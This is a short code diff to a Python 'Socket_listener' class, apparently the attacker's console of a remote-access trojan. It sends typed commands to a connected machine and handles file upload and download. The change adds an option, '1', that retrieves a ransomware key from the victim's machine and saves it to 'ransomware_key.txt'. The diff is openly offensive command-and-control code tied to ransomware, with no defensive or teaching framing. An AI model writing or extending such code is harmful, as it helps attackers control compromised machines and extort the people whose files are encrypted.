@@ -44,7 +44,7 @@ class Socket_listener():
 		
 	def sencommand(self):
 		while True:
-			command_input = input("enter command: ")
+			command_input = input("enter command:(if get ransomware key insert 1): ")
 			command_input = command_input.split(" ")
 			try:
 				if command_input[0] == "upload":
@@ -54,6 +54,9 @@ class Socket_listener():
 				command_output = self.command_ex(command_input)
 				if command_input[0] == "download":
 					command_output = self.save_file(command_input[1],command_output)
+				if command_input[0] == '1':
+					command_output = self.save_file("ransomware_key.txt",command_output)
+
 			except Exception:
 				command_output = "Error !"
 			
